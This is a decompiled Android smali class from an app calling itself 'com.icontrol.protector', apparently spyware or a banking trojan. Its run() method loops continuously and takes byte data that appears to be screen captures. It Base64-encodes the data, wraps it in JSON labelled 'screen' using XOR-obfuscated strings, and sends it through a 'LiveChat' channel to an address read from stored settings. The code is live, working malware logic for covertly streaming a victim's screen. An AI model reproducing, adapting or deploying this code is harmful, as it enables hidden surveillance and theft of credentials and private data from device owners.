.class Lcom/icontrol/protector/AccessServices$e;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/AccessServices;->d(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Landroid/content/Context;

.field final synthetic f:Lcom/icontrol/protector/AccessServices;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/AccessServices;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/AccessServices$e;->f:Lcom/icontrol/protector/AccessServices;

    iput-object p2, p0, Lcom/icontrol/protector/AccessServices$e;->e:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    const/16 v0, 0x3e8

    :catch_0
    :cond_0
    :goto_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-static {v1, v2}, Lcom/icontrol/protector/AccessServices;->g(J)J

    :try_start_0
    iget-object v1, p0, Lcom/icontrol/protector/AccessServices$e;->f:Lcom/icontrol/protector/AccessServices;

    invoke-static {v1, v0}, Lcom/icontrol/protector/AccessServices;->h(Lcom/icontrol/protector/AccessServices;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :catch_1
    const/16 v0, 0xbb8

    :try_start_1
    iget-object v1, p0, Lcom/icontrol/protector/AccessServices$e;->e:Landroid/content/Context;

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->E:Ljava/lang/String;

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v1, v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_0

    const/16 v0, 0xa

    invoke-static {}, Lcom/icontrol/protector/a;->A()[B

    move-result-object v1

    if-eqz v1, :cond_0

    const/4 v2, 0x0

    invoke-static {v1, v2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v1

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    const/4 v4, 0x4

    new-array v5, v4, [B

    fill-array-data v5, :array_0

    const/16 v6, 0x8

    new-array v7, v6, [B

    fill-array-data v7, :array_1

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    const/4 v7, 0x6

    new-array v7, v7, [B

    fill-array-data v7, :array_2

    new-array v8, v6, [B

    fill-array-data v8, :array_3

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v5, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v5, 0x3

    new-array v5, v5, [B

    fill-array-data v5, :array_4

    new-array v7, v6, [B

    fill-array-data v7, :array_5

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v1, v4, [B

    fill-array-data v1, :array_6

    new-array v5, v6, [B

    fill-array-data v5, :array_7

    invoke-static {v1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/4 v5, 0x1

    new-array v7, v5, [B

    const/16 v8, 0x1c

    aput-byte v8, v7, v2

    new-array v8, v6, [B

    fill-array-data v8, :array_8

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v1, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v1, v4, [B

    fill-array-data v1, :array_9

    new-array v7, v6, [B

    fill-array-data v7, :array_a

    invoke-static {v1, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v5, v5, [B

    const/16 v7, 0x4f

    aput-byte v7, v5, v2

    new-array v2, v6, [B

    fill-array-data v2, :array_b

    invoke-static {v5, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v1, v4, [B

    fill-array-data v1, :array_c

    new-array v2, v6, [B

    fill-array-data v2, :array_d

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/icontrol/protector/AccessServices$e;->f:Lcom/icontrol/protector/AccessServices;

    iget v2, v2, Lcom/icontrol/protector/AccessServices;->g:I

    invoke-virtual {v3, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    new-array v1, v4, [B

    fill-array-data v1, :array_e

    new-array v2, v6, [B

    fill-array-data v2, :array_f

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/icontrol/protector/AccessServices$e;->f:Lcom/icontrol/protector/AccessServices;

    iget v2, v2, Lcom/icontrol/protector/AccessServices;->h:I

    invoke-virtual {v3, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/icontrol/protector/AccessServices$e;->e:Landroid/content/Context;

    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->x:Ljava/lang/String;

    new-array v5, v4, [B

    fill-array-data v5, :array_10

    new-array v7, v6, [B

    fill-array-data v7, :array_11

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-array v3, v4, [B

    fill-array-data v3, :array_12

    new-array v4, v6, [B

    fill-array-data v4, :array_13

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    iget-object v2, p0, Lcom/icontrol/protector/AccessServices$e;->e:Landroid/content/Context;

    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->w:Ljava/lang/String;

    const/4 v4, 0x0

    invoke-static {v2, v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    :cond_1
    iget-object v3, p0, Lcom/icontrol/protector/AccessServices$e;->e:Landroid/content/Context;

    invoke-static {v3, v2, v1}, Lcom/icontrol/protector/LiveChat;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0

    :array_0
    .array-data 1
        0x0t
        0x5et
        0x5t
        0x2at
    .end array-data

    :array_1
    .array-data 1
        0x74t
        0x27t
        0x75t
        0x4ft
        -0xdt
        -0x35t
        0x5t
        -0x3et
    .end array-data

    :array_2
    .array-data 1
        -0x19t
        -0x56t
        -0x64t
        -0x37t
        -0x71t
        0x4t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x6ct
        -0x37t
        -0x12t
        -0x54t
        -0x16t
        0x6at
        0x1t
        -0x74t
    .end array-data

    :array_4
    .array-data 1
        -0x7t
        0x23t
        -0x52t
    .end array-data

    :array_5
    .array-data 1
        -0x70t
        0x4et
        -0x37t
        0x40t
        -0x2at
        -0x9t
        0x9t
        -0x33t
    .end array-data

    :array_6
    .array-data 1
        -0x57t
        0x2at
        -0x64t
        -0x43t
    .end array-data

    :array_7
    .array-data 1
        -0x31t
        0x58t
        -0xft
        -0x37t
        -0x6dt
        0x75t
        -0x30t
        0x68t
    .end array-data

    :array_8
    .array-data 1
        0x6bt
        -0x2bt
        0x49t
        -0x3ft
        -0x27t
        -0x34t
        -0x42t
        0x7t
    .end array-data

    :array_9
    .array-data 1
        0x60t
        -0x43t
        0x54t
        0x30t
    .end array-data

    :array_a
    .array-data 1
        0x13t
        -0x2at
        0x38t
        0x49t
        0x53t
        -0x7ct
        0xbt
        0x3et
    .end array-data

    :array_b
    .array-data 1
        0x7et
        -0x4bt
        -0x6ft
        -0x2ft
        0x61t
        -0xdt
        -0x4bt
        0x48t
    .end array-data

    :array_c
    .array-data 1
        -0x7dt
        -0x79t
        -0x5bt
        0x45t
    .end array-data

    :array_d
    .array-data 1
        -0xct
        -0x16t
        -0x36t
        0x27t
        -0x2et
        -0x11t
        0x64t
        -0x41t
    .end array-data

    :array_e
    .array-data 1
        0x7t
        -0x76t
        -0x72t
        0x7ct
    .end array-data

    :array_f
    .array-data 1
        0x6ft
        -0x19t
        -0x1ft
        0x1et
        -0x43t
        -0xdt
        -0x7bt
        0x74t
    .end array-data

    :array_10
    .array-data 1
        0x11t
        -0x4at
        -0x1ct
        -0x16t
    .end array-data

    :array_11
    .array-data 1
        0x7ft
        -0x3dt
        -0x78t
        -0x7at
        0x6ct
        0x4dt
        -0xdt
        -0x53t
    .end array-data

    :array_12
    .array-data 1
        -0x25t
        0x62t
        -0x65t
        0x78t
    .end array-data

    :array_13
    .array-data 1
        -0x4bt
        0x17t
        -0x9t
        0x14t
        -0x44t
        0x72t
        -0x38t
        0x10t
    .end array-data
.end method
